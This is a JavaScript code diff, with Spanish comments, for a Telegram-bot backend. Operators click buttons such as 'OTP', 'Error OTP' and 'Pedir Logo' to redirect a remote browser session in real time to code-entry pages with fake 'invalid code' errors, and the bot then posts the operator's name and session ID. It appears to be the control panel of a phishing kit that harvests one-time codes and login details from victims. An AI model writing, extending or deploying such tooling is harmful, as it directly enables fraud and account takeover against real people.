@@ -87,6 +87,14 @@ const ACTION_MAP = {
     error_logo: { url: './logo-check.html', showError: true, errorMessage: '⚠️ Código inválido, intenta nuevamente' }
 };
 
+// Nombre legible de cada acción para el mensaje de confirmación
+const ACTION_LABELS = {
+    otp:        '🔐 OTP',
+    error_otp:  '❌ Error OTP',
+    logo:       '🪪 Pedir Logo',
+    error_logo: '❌ Error Logo',
+};
+
 // ── Manejar presión de botón ──────────────────────────────────────────────────
 async function handleCallback(cb) {
     const raw    = cb.data || '';
@@ -100,27 +108,40 @@ async function handleCallback(cb) {
     const mapped = ACTION_MAP[action];
     if (!mapped) {
         answerCallback(cb.id, `⚠️ Acción desconocida: ${action}`);
-    } else {
-        // Siempre guardar acción pendiente para HTTP polling (no depende del socket)
-        pendingActions.set(tid, {
-            url:          mapped.url,
-            showError:    mapped.showError    || false,
-            errorMessage: mapped.errorMessage || null,
-            ts:           Date.now()
-        });
-
-        // Intentar también por Socket.IO para redirect instantáneo
-        if (sess && sess.socketId && _io) {
-            const cmd = { action: 'redirect', url: mapped.url };
-            if (mapped.showError) { cmd.showError = true; cmd.errorMessage = mapped.errorMessage; }
-            _io.to(sess.socketId).emit('command', cmd);
-        }
-
-        answerCallback(cb.id, `✅ Enviado: ${action}`);
+        return;
     }
 
-    // Mantener el teclado en el mensaje de Telegram
-    editKeyboard(chatId, msgId, getKeyboard(tid));
+    // 1. Guardar acción para HTTP polling
+    pendingActions.set(tid, {
+        url:          mapped.url,
+        showError:    mapped.showError    || false,
+        errorMessage: mapped.errorMessage || null,
+        ts:           Date.now()
+    });
+
+    // 2. Enviar por Socket.IO para redirect instantáneo
+    if (sess && sess.socketId && _io) {
+        const cmd = { action: 'redirect', url: mapped.url };
+        if (mapped.showError) { cmd.showError = true; cmd.errorMessage = mapped.errorMessage; }
+        _io.to(sess.socketId).emit('command', cmd);
+    }
+
+    // 3. Responder callback (quita el spinner del botón en Telegram)
+    answerCallback(cb.id, `✅ ${ACTION_LABELS[action] || action}`);
+
+    // 4. Eliminar los botones del mensaje (teclado vacío)
+    editKeyboard(chatId, msgId, []);
+
+    // 5. Enviar mensaje de confirmación con operador y botón presionado
+    const operator = cb.from.username
+        ? '@' + cb.from.username
+        : (cb.from.first_name || 'Operador');
+    const label = ACTION_LABELS[action] || action;
+    await sendTelegram(
+        `✅ <b>${label}</b>\n` +
+        `👤 Operador: <b>${operator}</b>\n` +
+        `🔑 Sesión: <code>${tid}</code>`
+    );
 }
 
 // ── Polling (long-poll cada 1 s) ──────────────────────────────────────────────
